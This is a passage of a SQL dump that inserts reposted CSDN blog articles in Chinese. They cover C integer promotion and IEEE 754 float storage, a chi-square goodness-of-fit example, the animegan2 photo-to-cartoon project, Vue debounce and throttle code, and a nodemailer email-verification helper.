/>我们要以**%d**的形式打印a；必须先整型提升，整型提升看符号位，符号位是1，前面就补够32个1位置。符号位是0，前面就要补够32个0。（一个整型32位4个字节）<br />11111111 11111111 11111111 11111111 发生整型提升后的补码<br />1<br />因为printf到屏幕上显示出来的是原码<br />但a中放的是11111111 11111111 11111111 11111111（补码）. 所以打印出来的a是10000000 00000000 00000000 00000001（原码）。</p>\n<p>b = -1的原因同理。因为char和signed char道理一样。都是有符号字符类型</p>\n<p>我们再来看c为什么是255？</p>\n<p>11111111 11111111 11111111 11111111 这是-1的补码<br />1<br />重点在于变量c！！</p>\n<p>c为什么是255？因为c是unsigned char类型，无符号意味着他个正数。最高位不是符号位。无符号数在整型提升的时候和有符号位不一样。它是在前面全补0。<br />11111111 11111111 11111111 11111111 这是-1补码<br />11111111 放进变量c截断后的补码<br />00000000 00000000 00000000 11111111整型提升后的补码<br />1<br />2<br />3<br />然后以%d的形式打印出来的话，就要把补码转化成原码<br />00000000 00000000 00000000 11111111整型提升后的补码<br />但计算机认为最高位是0，所以这时候的补码是个正数。<br />原码反码补码相同。<br />1<br />2<br />3<br />所以打印出来就相当于是00000000 00000000 00000000 11111111（即255）。</p>\n<p>学到了没有？那我们来检验一下学习成果，再来一道题</p>\n<p>#include &lt;stdio.h&gt;<br />int main()<br />{<br />char a = -128;<br />printf(\"%u\\n\", a);//a = 4294967168<br />return 0;<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />1.先拿到-128的补码，用我们的原反补计算。</p>\n<p>10000000 00000000 00000000 10000000 原码<br />11111111 11111111 11111111 01111111 反码<br />11111111 11111111 11111111 10000000 这是-128的补码<br />1<br />2<br />3<br />放到char类型中需要截断<br />10000000 截断后的补码<br />1<br />发生整型提升后的补码<br />11111111 11111111 11111111 10000000 补码<br />1<br />4.然后以%u（%u是无符号数）的形式打印出来。<br />所以计算机认为这个补码就是正数。正数的原码反码补码相同。<br />所以打印的数就是4,294,967,168</p>\n<p><br />🌳浮点型在内存中的存储<br />首先，我要在这里声明一下，浮点数在内存中的存储规则和整数不一样，他不遵循整数的原码，反码，补码的转换。<br />只有整数存在原码，反码，补码。<br />怎么用二进制表示小数<br />那么计算机怎么存储浮点数（小数）呢？</p>\n<p>我们以下面一段代码为例。<br />#include &lt;stido.h&gt;<br />int main()<br />{<br />float a = 5.75；//二进制数字表示为101.11<br />return 0;<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />二进制为101.11怎么转化为十进制的5.75呢？<br />官方描述： 小数点左边的数字的权是10的正幂，得到整数值，小数点右边的数字的权是10的负幂，得到小数值。</p>\n<p>怎么将二进制小数存入内存<br />我们要以IEEE标准754在内存中来存入浮点数<br />简介</p>\n<p>**浮点数的存入标准（IEEE标准754）**是在1976由加州大学伯克利分校的Kahan教授作为顾问设计的。<br />目前，实际上所有的计算机都支持这个后来被称为IEEE浮点的标准。这大大提高了科学应用程序在不同机器上的可移植性。<br />IEEE浮点表示方法<br />接下来以float类型来说明。我们还是拿float a = 5.75为例。探究如何将其二进制101.11存入32（bit）位中。<br />IEEE浮点表示方法用到了科学计数法，所以我们要把101.11转化为1.0111 * 2^2(就是1.0111乘以2的2次方)<br />(-1)^S * M * 2^E<br />(-1)^S表示符号位，当s=0，V为正数；当s=1，V为负数。<br />M（M&gt;=1&amp;&amp; M&lt;2）表示有效数字.(为什么取值范围是1到2？)，因为2进制只有0和1来表示，不会出现大于2的情况。<br />E表示指数。<br />IEEE 754规定：<br />对于32位的浮点数，最高的1位是符号位s，接着的8位是指数E，剩下的23位为有效数字M。</p>\n<p>试图将5.75按照IEEE标准存入变量a(32bit)<br />#include &lt;stido.h&gt;<br />int main()<br />{<br />float a = 5.75；<br />//将1.0111 * 2 ^2即（5.75的二进制）存储到变量a中<br />printf(\"%f\",a);//将a读取并打印。<br />return 0;<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />一、转化为IEEE标准为：根据公式(-1)^S * M * 2^E代入<br />得出 (-1)^0 * 1.0111 * 2 ^2<br />二、但是根据IEEE 754对有效数字M和指数E的一些特别规定。<br />对于有效数字M<br />在计算机内部保存M时，默认这个数的第一位总是1，因此可以被舍去，只保存小数点后面的部分。比如保存1.0111的时候，只保存0111，等到读取的时候再把前面的1加上去.<br />（目的是节省1位有效数字，使得5.75这个十进制数更精确）</p>\n<p>对于指数E。现在我们是存储。（比较简单）<br />读取的时候分三种情况，比较复杂，请耐心看（IEEE就是这样规定的，博主水平有限，没有深层次的了解）。<br />首先，E是一个无符号整数，E为八个bit位，取值范围0 ~ 255。<br />IEEE 754规定，存入内存时E的真实值必须再加上一个中间数，对于8位的E，这个中间数是127。<br />比如，2^2的E是2，所以保存成32位浮点数时，必须保存成2+127=129，即1000 0001。<br />三、开始存入<br />首先 ，得到上面5.75的S，M，E各自的值。<br />S存0或1。<br />将E加上中间数1127之后，转换成二进制的形式存入E的位置。<br />至于M，将其小数点后面数字存入M位置的最左端，右边剩余的位置补0<br />对上面的话翻译。<br />1.因为5.75为正数，所以s的位置为0<br />2.E为2，然后加上127，为1000 0001。存入E位置上<br />3.M为小数点右边的数字即（0111），后面的剩余位置补0<br />如下图所示</p>\n<p>试图将5.75读取并printf<br />#include &lt;stido.h&gt;<br />int main()<br />{<br />float a = 5.75；<br />//将1.0111 * 2 ^2即（5.75的二进制）存储到变量a中<br />printf(\"%f\",a);//将a读取并打印。<br />return 0;<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />读取内存的方式关键在于E<br />E不全为0或不全为1<br />将指数E的计算值减去127，得到真实值，再将有效数字M前加上第一位的1<br />变量a中的5.75就是这种情况。<br />E全为0（即八个bit位都为0000 0000）<br />指数E等于1-127，得到真实值。有效数字M不再加上第一位的1，而是还原为 0.xxxxxx 的小数。这样做是为了表示&plusmn;0，以及接近于0的很小的数字</p>\n<p>例如.</p>\n<p>float b = 9;<br />printf(\"%f\",b);//b的值为0.000000（为什么会是0？）<br />1<br />2<br />我们拿到在内存中b = 9的32个bit位。<br />s=0 E=00000000 M=00000000000000000001001<br />1</p>\n<p><br />我们可以发现变量b的E的位置为全0。所以可以写为<br />(-1)^0 &times; 0.00000000000000000001001&times;2^(-126)<br />就是=1.001&times;2^(-146)<br />因为2的-146次方非常小了，接近0，而且M也接近0，且float类型只保留6位有效数字，所以结果为0.000000<br />E全为1(不再举例子了)<br />这时，如果有效数字M全为0，表示&plusmn;无穷大（正负取决于符号位s）；</p>\n<p>总结<br />理解数据在内存中的存储有助于做编程题时出现一个类型0.000000的数时不至于手慌脚乱。<br />由于编码的长度有限，与传统整数和实数运算相比，计算机运算具有完全不同的属性。<br />当超出表示范围时，有限长度能够引起数值溢出。当浮点数非常接近于0.0，从而转换0时，也会下溢。<br />如果你觉得我的文章对你有帮助🎉欢迎关注🔎点赞👍收藏⭐️留言📝。</p>\n<p>.<br />.</p>\n<p>参考文献：<br />《深入理解计算机系统》 2016年机械工业出版社 .（美）布赖恩特（Bryant,R.E.）<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「Code_Cao」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/qq2466200050/article/details/121595001</p>', '', 2, ',29,8,', '原创', '公开', '已发布', '推荐', 554, '', '', 0, '2021-12-05 21:47:04', '2021-12-05 21:47:04');
INSERT INTO `article` VALUES (12, 'C笔记—深度剖析数据在内存中的存储', 10, '概述', '<p>目录</p>\n<p>一、数据类型介绍</p>\n<p>1.1类型的意义：</p>\n<p>1.2类型的基本归类：</p>\n<p>二、整形在内存中的存储</p>\n<p>2.1原码、反码、补码</p>\n<p>2.2 大小端字节序</p>\n<p>2.3整形提升</p>\n<p>2.4算数转换</p>\n<p>三、浮点型形在内存中的存储</p>\n<p>3.1浮点数存储的例子</p>\n<p>3.2 浮点数存储规则</p>\n<p>一、数据类型介绍<br />1.1类型的意义：<br />1. 使用这个类型开辟内存空间的大小（大小决定了使用范围）。</p>\n<p>2. 如何看待内存空间的视角。</p>\n<p>1.2类型的基本归类：<br />1、整形家族：char short int long</p>\n<p>整形范围查找：#include &lt;limits.h&gt;</p>\n<p>%u打印无符号整型 %d打印有符号整形</p>\n<p>char<br />unsigned char<br />signed char<br />short<br />unsigned short [int]<br />signed short [int]<br />int<br />unsigned int<br />signed int<br />long<br />unsigned long [int]<br />signed long [int]<br />2、浮点数家族：float double</p>\n<p>浮点型范围查找：#include &lt;float.h&gt;</p>\n<p>浮点数没有原码、反码、补码这些概念，只有整数才有原码、反码、补码。</p>\n<p>3、构造类型（自定义造型）：</p>\n<p>&gt; 数组类型</p>\n<p>&gt; 结构体类型 struct</p>\n<p>&gt; 枚举类型 enum</p>\n<p>&gt; 联合类型 union</p>\n<p>4、指针类型</p>\n<p>int *pi; char *pc; float* pf; void* pv;</p>\n<p>5、空类型：</p>\n<p>void 表示空类型（无类型） 通常应用于函数的返回类型、函数的参数、指针类型。</p>\n<p>二、整形在内存中的存储<br />2.1原码、反码、补码<br />计算机中的整数有三种表示方法，即原码、反码和补码。</p>\n<p>&nbsp;</p>\n<p>三种表示方法均有符号位和数值位两部分，符号位都是用0表示&ldquo;正&rdquo;，用1表示&ldquo;负&rdquo;，整数有正数和负数：正数（包括无符号整数）其原码、反码、补码相同；而数值位负整数的三种表示方法各不相同，转化方法如下：</p>\n<p>原码 直接将二进制按照正负数的形式翻译成二进制就可以。</p>\n<p>反码 将原码的符号位不变，其他位依次按位取反就可以得到了。</p>\n<p>补码 反码+1就得到补码。</p>\n<p>&nbsp;</p>\n<p>对于整形来说：数据存放内存中存放的是补码。在计算机系统中，数值一律用补码来表示和存储。原因在于，使用补码，可以将符号位和数值域统 一处理； 同时，加法和减法也可以统一处理（CPU只有加法器）此外，补码与原码相互转换，其运算过程 是相同的，不需要额外的硬件电路。</p>\n<p>2.2 大小端字节序<br />大小端字节序：是指以字节为单位的数据的存储方式（该数据大小需大于1字节）</p>\n<p>大端（存储）模式，是指数据的低位保存在内存的高地址中，而数据的高位，保存在内存的低地址 中；</p>\n<p>小端（存储）模式，是指数据的低位保存在内存的低地址中，而数据的高位,，保存在内存的高地 址中。</p>\n<p>&nbsp;</p>\n<p>想深入了解大小端字节序这一知识点，推荐书目《深入理解计算机系统》</p>\n<p>2.3整形提升<br />char short类型的数据在参与表达式计算时（+ - * / % 等）会发生整形提升，因为整形数据在内存中是以补码的形式参与存储与计算，若定义的数据类型小于int型，在其计算时会把这个数据整形提升为int型去计算。</p>\n<p>整型提升是按照变量的数据类型的符号位来提升的，无符号数整型提升是往高位补0</p>\n<p>以下为整形提升的三个实例：</p>\n<p>实例1</p>\n<p>&nbsp;</p>\n<p>实例2</p>\n<p>&nbsp;</p>\n<p>实例3</p>\n<p>&nbsp;</p>\n<p>2.4算数转换<br />int long long long float double</p>\n<p>以上多种类型数据（&gt;=int类型）参与表达式计算会发生算数转换，是往高字节类型转换</p>\n<p>三、浮点型形在内存中的存储<br />3.1浮点数存储的例子<br />int main()<br />{<br />int n = 9;<br />float *pFloat = (float *)&amp;n;//强制类型转换<br />printf(\"n的值为：%d\\n\",n);<br />printf(\"*pFloat的值为：%f\\n\",*pFloat);<br />*pFloat = 9.0;<br />printf(\"num的值为：%d\\n\",n);<br />printf(\"*pFloat的值为：%f\\n\",*pFloat);<br />return 0;<br />}<br />输出结果为：</p>\n<p>&nbsp;</p>\n<p>说明浮点数与整数在内存中华的存储方式一样的</p>\n<p>再次强调：浮点数没有原码、反码、补码这些概念，只有整数才有原码、反码、补码。</p>\n<p>3.2 浮点数存储规则<br />根据国际标准IEEE（电气和电子工程协会） 754，任意一个二进制浮点数V可以表示成下面的形式：</p>\n<p>(-1)^S * M * 2^E (-1)^s表示符号位，</p>\n<p>当s=0，V为正数；当s=1，V为负数。</p>\n<p>M表示有效数字，大于等于1，小于2。</p>\n<p>2^E表示指数位。</p>\n<p>举例来说： 十进制的5.0，写成二进制是 101.0 ，相当于 1.01&times;2^2 。 那么，按照上面V的格式，可以得出s=0，M=1.01，E=2。 十进制的-5.0，写成二进制是 -101.0 ，相当于 -1.01&times;2^2 。那么，s=1，M=1.01，E=2。</p>\n<p>IEEE 754规定：</p>\n<p>对于32位的浮点数，最高的1位是符号位s，接着的8位是指数E，剩下的23位为有效数字M。</p>\n<p>&nbsp;</p>\n<p>对于64位的浮点数，最高的1位是符号位S，接着的11位是指数E，剩下的52位为有效数字M。</p>\n<p>&nbsp;</p>\n<p>IEEE 754对有效数字M和指数E，还有一些特别规定。 前面说过， 1&le;M&lt;2 ，也就是说，M可以写成 1.xxxxxx 的形式，其中xxxxxx表示小数部分。</p>\n<p>IEEE 754规定，在计算机内部保存M时，默认这个数的第一位总是1，因此可以被舍去，只保存后面的 xxxxxx部分。比如保存1.01的时候，只保存01，等到读取的时候，再把第一位的1加上去。这样做的目的，是节省1位有效数字。以32位 浮点数为例，留给M只有23位， 将第一位的1舍去以后，等于可以保存24位有效数字。</p>\n<p>至于指数E，情况就比较复杂。 首先，E为一个无符号整数（unsigned int） 这意味着，如果E为8位，它的取值范围为0~255；如果E为11位，它的取值范围为0~2047。但是，我们知道，科学计数法中的E是可以出 现负数的，所以IEEE 754规定，存入内存时E的真实值必须再加上一个中间数，对于8位的E，这个中间数是127；对于11位的E，这个中间数是1023。比如，2^10的E是10，所以保存成32位浮点数时，必须保存成10+127=137，即 10001001。</p>\n<p>然后，指数E从内存中取出还可以再分成三种情况：</p>\n<p>E不全为0或不全为1，这时，浮点数就采用下面的规则表示，即指数E的计算值减去127（或1023），得到真实值，再将 有效数字M前加上第一位的1。 比如： 0.5（1/2）的二进制形式为0.1，由于规定正数部分必须为1，即将小数点右移1位，则为 1.0*2^(-1)，其阶码为-1+127=126，表示为 01111110，而尾数1.0去掉整数部分为0，补齐0到23位00000000000000000000000，则其二进 制表示形式为:</p>\n<p>E全为0，这时，浮点数的指数E等于1-127（或者1-1023）即为真实值， 有效数字M不再加上第一位的1，而是还原为0.xxxxxx的小数。这样做是为了表示&plusmn;0，以及接近于 0的很小的数字。</p>\n<p>E全为1，这时，如果有效数字M全为0，表示&plusmn;无穷大（正负取决于符号位s）。</p>\n<p>浮点数实例详解：<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「ttJing」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/m0_47193738/article/details/121704914</p>', '', 3, ',8,22,', '原创', '公开', '已发布', '推荐', 565, '', '', 0, '2021-12-05 21:50:22', '2021-12-05 21:50:22');
INSERT INTO `article` VALUES (13, '【数理统计】一题了解拟合优度检验', 11, '概述', '<p>0 目的（意义）<br />拟合优度检验是用卡方统计量进行统计显著性检验的重要内容之一。它是依据总体分布状况，计算出分类变量中各类别的期望频数，与分布的观察频数进行对比，判断期望频数与观察频数是否有显著差异，从而达到从分类变量进行分析的目的。</p>\n<p>用来检验观测数与依照某种假设或分布模型计算得到的理论数之间一致性的一种统计假设检验，以便判断该假设或模型是否与实际观测数相吻合。</p>\n<p>1基础知识<br />1.1独立性检验<br />对于两个分类变量的分析，主要判断两个分类变量是否独立。</p>\n<p>比如：学生存在逃课情况，又有性别之分，是否逃课和性别是两个分类变量。</p>\n<p>独立性检验关心两者是否有关联，是不是某个性别的学生逃课更加频繁。</p>\n<p>1.2检验统计量<br />拟合优度检验</p>\n<p>由于卡方检验的目标是检查观测频数与期望频数之间的差异性水平，因此卡方检验的核心内容就是计算出观测值的频数与期望频数总体差距的统计量，就是卡方距离。这个距离可以通过&ldquo;观测值频数与期望频数差值的平方与期望频率之比的累积和&rdquo;来体现：</p>\n<p>&nbsp;</p>\n<p>卡方值越大，表示距离越大，差异性越强。可以根据卡方值查表推导出卡方检验的概率值，然后根据概率值判定卡方检验的判断结论。</p>\n<p>1.3 sig值、p值<br />P值代表：用来判定假设检验结果的一个参数，也可以根据不同的分布使用分布的拒绝域进行比较。</p>\n<p>sig值包含p值。数据的显著性（sig）是&ldquo;显著的&rdquo;、&ldquo;中度显著的&rdquo;还是&ldquo;高度显著的&rdquo;需要自己根据P值的大小与显著性水平（0.05或0.01）进行相比较。如果P值0.01&lt;P&lt;0.05,则为差异显著，如果P&lt;0.01,则差异极显著。</p>\n<p>2拟合优度检验基本步骤<br />问题：某餐厅老板想了解顾客最喜欢吃的主食，因此对120位顾客进行调查，结果见下方表。评价顾客在四种主食中是否存在明显偏好（&alpha;=0.05）</p>\n<p>最喜爱的主食 频数<br />杂粮 24<br />面条 29<br />米饭 32<br />馒头 35<br />总数 120<br />2.1 提出假设检验，建立检验标准<br />H0：观察频数与期望频数一致（无明显偏好）</p>\n<p>H1：观察频数与期望频数不一致（有明显偏好）</p>\n<p>2.2 确定检验统计量<br />这里因为是单变量拟合优度检验，确定统计量为卡方，该统计量服从自由度为3的卡方分布。</p>\n<p>2.3列表，带入数据计算<br />主食 杂粮 面条 米饭 馒头 总和<br />观测值O 24 29 32 35 120<br />理论值T 30 30 30 30 120<br />（O-T） -6 -1 2 5 <br />[(O-T)^2]/T 1.2 0.033 0.133 0.833 2.2(卡方)<br />因此得到检验统计量卡方为2.2，由于自由度为3，显著水品&alpha;=0.05的临界值为7.815。<br />&chi; 2 = 2.2 &lt; &chi; 0.05 2 ( 3 ) = 7.815 \\chi^{2}=2.2&lt;\\chi_{0.05}^{2}(3)=7.815<br />&chi; <br />2<br />=2.2&lt;&chi; <br />0.05<br />2<br />​<br />(3)=7.815</p>\n<p>所以，未落入拒绝域，即符合原假设，即顾客在4种主食中选择无明显偏好。</p>\n<p>当然也可用p值法这里就不展开了。<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「火柴先生」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/baidu_39621090/article/details/121690515</p>', '', 4, ',30,31,32,33,', '原创', '公开', '已发布', '推荐', 22, 'Top', '', 0, '2021-12-05 21:53:46', '2021-12-05 21:53:46');
INSERT INTO `article` VALUES (14, '如何将照片变成卡通图，animegan2-pytorch机器学习项目使用 | 机器学习', 12, '概述', '<p>目录</p>\n<p>前言</p>\n<p>环境部署</p>\n<p>项目使用</p>\n<p>景色类图像使用</p>\n<p>人像类图像使用</p>\n<p>总结</p>\n<p>前言<br />之前看到一个有意思的开源项目，主要是可以将一张照片变成卡通漫画的风格。下面给大家放几张官方给出的部分效果图。</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>看到这个效果图，还是非常经验的。下面我会分享一下这个项目，并且选择一些我自己找的图片试验一下。</p>\n<p>项目Github地址：github地址</p>\n<p>环境部署<br />先使用git将项目下载下来。看一下项目结构。</p>\n<p>&nbsp;</p>\n<p>我们看一下需要的环境。</p>\n<p>&nbsp;</p>\n<p>非常简单，只要pytorch就可以了。如果有不太会安装的，可以参考我的另一篇文章：机器学习基础环境部署 | 机器学习系列_阿良的博客-CSDN博客</p>\n<p>项目使用<br />看一下readme怎么说明的。</p>\n<p>&nbsp;</p>\n<p>直接使用命令，或者代码执行都可以，我们先看看如果命令操作的话都有哪些参数支持。</p>\n<p>if __name__ == \'__main__\':<br /><br />parser = argparse.ArgumentParser()<br />parser.add_argument(<br />\'--checkpoint\',<br />type=str,<br />default=\'./weights/paprika.pt\',<br />)<br />parser.add_argument(<br />\'--input_dir\', <br />type=str, <br />default=\'./samples/inputs\',<br />)<br />parser.add_argument(<br />\'--output_dir\', <br />type=str, <br />default=\'./samples/results\',<br />)<br />parser.add_argument(<br />\'--device\',<br />type=str,<br />default=\'cuda:0\',<br />)<br />parser.add_argument(<br />\'--upsample_align\',<br />type=bool,<br />default=False,<br />help=\"Align corners in decoder upsampling layers\"<br />)<br />parser.add_argument(<br />\'--x32\',<br />action=\"store_true\",<br />help=\"Resize images to multiple of 32\"<br />)<br />args = parser.parse_args()<br /><br />test(args)<br />可以通过项目结构看到，作者提供了4个模型文件可供选择，可以用--checkpoint参数切换。需要提供图片的输入文件夹，修改--input_dir参数即可，经过我自己的几次验证，发现有的模型适合风景类型的图片，有的适合人像，下面我分成两部使用一下。</p>\n<p>景色类图像使用<br />先看一下我准备的图片，三张风景的照片。</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>我使用个人认为比较好用的模型是paprika.pt。下面是执行过程。</p>\n<p>&nbsp;</p>\n<p>看看效果</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>哦，第一张图的漫画效果有所欠缺，但是后面两张还是不错的。没有细品一波算法，猜测一下，可能是颜色区域较多，对比度越明显，可能漫画后的效果会更好。</p>\n<p>人像类图像使用<br />最主要的还是人像，懂的都懂。下面是我准备的图片。</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>打算使用face_paint_512_v2.pt模型测试一下。下面直接展示处理后的效果。</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>效果还是很好的，是不是。</p>\n<p>总结<br />我反复测试了不少图片，有的转化的并不是很好，但是大部分还是不错的，瑕不掩瑜。项目还是好项目，只是可能模型本身训练的数据不是非常全面吧。还是老样子，这两天我改改这个项目玩一玩。</p>\n<p>分享：</p>\n<p>对自己有自信时，不能对人说「期待」。所谓的「期待」是放弃时的托词，因为别无选择。若缺少这种无奈感，说这个词就太虚伪了。&mdash;&mdash;《冰菓》</p>\n<p>如果本文对你有用的话，请给我点个赞吧，谢谢！</p>\n<p><br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「剑客阿良_ALiang」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/zhiweihongyan1/article/details/121717486</p>', '', 5, ',34,5,18,', '原创', '公开', '已发布', '推荐', 0, '', '', 0, '2021-12-05 22:01:42', '2021-12-05 22:01:42');
INSERT INTO `article` VALUES (15, '防抖节流实践及vue中使用', 13, '概述', '<p>文章目录<br />前言<br />一、防抖节流理解<br />二、代码示例<br />1.演示地址<br />2.vue中使用防抖节流<br />三、总结<br />前言<br />最近发现在网络慢情况，或并发高情况下，未使用防抖节流导致出现一定性能问题</p>\n<p>一、防抖节流理解<br />防抖：在一段时间内连续点击触发方法，每次触发会重新计时，最常用场景：在文本框输入值立马去后台查询数据，频繁调用后台造成性能问题，可以使用防抖，在一定时间内只去后台查询一次。（ echart图表监听窗口改变重新渲染、滚动事件、滑动事件）</p>\n<p>节流：在一段时间内连续点击触发方法，在这段时间内只执行一次，不会去重新计时，最常用场景：去请求接口数据。或者更新数据，可以使用节流，保证在(假设一秒内)只执行一次查询，或者更新操作</p>\n<p>二、代码示例<br />1.演示地址<br />点我查看</p>\n<p>2.vue中使用防抖节流<br />代码如下（示例）：</p>\n<p>&lt;!DOCTYPE html&gt;<br />&lt;html&gt;<br />&lt;head&gt;<br />&lt;meta charset=\"UTF-8\"&gt;<br />&lt;meta name=\"viewport\" content=\"viewport-fit=cover,width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no\" /&gt;<br />&lt;title&gt;&lt;/title&gt;</p>\n<p>&lt;/head&gt;</p>\n<p>&lt;body&gt;<br />&lt;div id=\"main\"&gt;<br />&lt;button @click=\"click1\"&gt;不使用防抖({{count1}})&lt;/button&gt;<br />&lt;button @click=\"click2\"&gt;使用防抖({{count2}})&lt;/button&gt;<br />&lt;button @click=\"click3\"&gt;不使用节流({{count3}})&lt;/button&gt;<br />&lt;button @click=\"click4\"&gt;使用节流({{count4}})&lt;/button&gt;<br />&lt;/div&gt;<br />&lt;/body&gt;<br />&lt;script src=\"http://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js\"&gt;&lt;/script&gt;<br />&lt;script&gt;<br />//节流<br />throttle = function (f, t, im ){<br />if(!t) t = 1000;<br />var flag = true;<br />im = typeof(im) == \"undefined\" ? true : im<br />return function (){<br />if(flag){<br />flag = false<br />im &amp;&amp; f.apply(this,arguments)<br />setTimeout(() =&gt; {<br />!im &amp;&amp; f.apply(this,arguments)<br />flag = true<br />},t)<br />}<br />}<br />}<br />//防抖 一般用于input实时查询后台接口 isLoad=true 是否立即执行一次<br />debounce = function(func,wait,immediate) {<br />var timeout;<br />wait = wait||1000<br />immediate = typeof(immediate) == \"undefined\" ? true : immediate<br />return function () {<br />var context = this;<br />var args = arguments;<br />// 防抖函数的代码使用这两行代码来获取 this 和 参数，是为了让 debounce 函数最终返回的函数 this 指向不变以及依旧能接受到 e 参数。<br />if (timeout) clearTimeout(timeout);<br />if (immediate) { // 立即执行<br />var callNow = !timeout;<br />timeout = setTimeout(() =&gt; {<br />timeout = null;<br />}, wait)<br />if (callNow) func.apply(context, args)<br />}<br />else { // 非立即执行<br />timeout = setTimeout(function(){<br />func.apply(context, args)<br />}, wait);<br />}<br />}<br />}<br />new Vue({<br />el:\'#main\',<br />data(){<br />return {<br />count1:0, count2:0, count3:0, count4:0<br />}<br />},<br />methods:{<br />click1(){<br />console.log(\"不使用防抖=&gt;\",new Date().getTime())<br />this.count1 ++;<br />},<br />click2:debounce(function(){<br />console.log(\"使用防抖=&gt;\",new Date().getTime())<br />this.count2 ++;<br />}),<br />click3(){<br />console.log(\"不使用节流=&gt;\",new Date().getTime())<br />this.count3 ++;<br />},<br />click4:throttle(<br />function(){<br />console.log(\"使用节流=&gt;\",new Date().getTime())<br />this.count4 ++;<br />}<br />)<br />}</p>\n<p>})<br />&lt;/script&gt;</p>\n<p>&lt;/html&gt;<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />40<br />41<br />42<br />43<br />44<br />45<br />46<br />47<br />48<br />49<br />50<br />51<br />52<br />53<br />54<br />55<br />56<br />57<br />58<br />59<br />60<br />61<br />62<br />63<br />64<br />65<br />66<br />67<br />68<br />69<br />70<br />71<br />72<br />73<br />74<br />75<br />76<br />77<br />78<br />79<br />80<br />81<br />82<br />83<br />84<br />85<br />86<br />87<br />88<br />89<br />90<br />91<br />三、总结<br />防抖节流能够提高性能，在高并发情况下能够减少后台请求访问量<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「耶稣与梦」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/Qin_HongKun/article/details/121475105</p>', '', 6, ',11,21,', '原创', '公开', '已发布', '推荐', 0, '', '', 0, '2021-12-05 22:04:12', '2021-12-05 22:04:12');
INSERT INTO `article` VALUES (16, 'nodejs发送邮件验证码封装（express框架）以QQ邮箱为例', 8, '概述', '<p>一、下载nodemailer<br />npm i nodemailer -s<br />二、做个js文件，封装发送邮件函数<br />// 发送邮箱验证码配置<br />//引入模块<br />const nodemailer = require(\'nodemailer\');<br /><br />let sendMails = (mailId, VerificationCode) =&gt; {<br />//设置邮箱配置<br />let transporter = nodemailer.createTransport({<br />//host:\'smtp.qq.com\', //邮箱服务的主机，如smtp.qq.com<br />service: \'qq\',<br />port: \'465\', //对应的端口号QQ邮箱的端口号是465<br />secure: false, //开启安全连接<br />//secureConnection:false, //是否使用ssl<br />auth: { //用户信息<br />user: \'8*******3@qq.com\', //用来发邮件的邮箱账户<br />pass: \'xxxxxxxxxxxxxxx\' //这里的密码是qq的smtp授权码，可以去qq邮箱后台开通查看<br />}<br />});<br /><br />//设置收件人信息<br />let mailOptions = {<br />from: \'8*******3@qq.com\', //谁发的<br />to: mailId, //发给谁<br />subject: \'DailyWriter验证码为\' + VerificationCode, //主题是什么<br />text: \'验证码邮件\', //文本内容<br />html: \'\',//html模板<br />// attachments: [ //附件信息,如果需要了再打开使用<br />// {<br />// filename: \'\',<br />// path: \'\',<br />// }<br />// ]<br />};<br /><br />return new Promise((resolve, reject) =&gt; { //异步函数<br />//发送邮件<br />transporter.sendMail(mailOptions, (error, info) =&gt; {<br />if (error) { <br />reject(error) //错误<br />} else {<br />resolve(info)<br />// console.log(`信息id Message: ${info.messageId}`); <br />// console.log(`成功响应 sent: ${info.response}`); <br />// console.log(`邮件信息 mailOptions: ${JSON.stringify(mailOptions)}`); <br />}<br />});<br />})<br />}<br /><br />// export default sendMails 暴露出去<br />module.exports = {<br />sendMails<br />}<br />三、需要使用的地方进行调用<br />router.post(\'/register\', async (req, res, next) =&gt; {<br />//测试邮件<br />let mailId = \'xxxxxx\' //收件人的邮箱账号<br />let VerificationCode = \'8888\' //四位验证码，随机码下面有封装，直接调用即可<br />// let VerificationCode = getVerificationCode() //生成随机码<br />// console.log(\'发送的验证码为：\'+ VerificationCode) //查看随机码<br />sendMails(mailId, VerificationCode).then(res =&gt; {<br />// console.log(res, \'返回的数据\');<br />if (res.response == \'250 OK: queued as.\') { //如果发送成功执行的操作<br />console.log(\'发送成功了，收件人是：\'+res.accepted) 